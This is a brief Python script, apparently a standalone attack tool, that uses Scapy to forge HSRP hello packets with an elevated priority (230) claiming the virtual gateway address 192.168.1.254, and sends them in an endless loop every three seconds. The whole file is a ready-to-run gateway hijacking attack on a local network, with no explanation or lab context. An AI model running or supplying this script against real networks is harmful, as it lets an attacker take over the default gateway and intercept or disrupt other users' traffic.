from scapy.all import *

ether = Ether(src="00:00:0c:07:ac:01", dst="01:00:5e:00:00:02")
ip = IP(src='192.168.1.12', dst='224.0.0.2', ttl=1)
udp = UDP(sport=1985,dport=1985)
hsrp = HSRP(group=1, priority=230, virtualIP='192.168.1.254')
toSend = ether/ip/udp/hsrp
toSend.show()
send(toSend, iface='eth0', inter=3, loop=1)
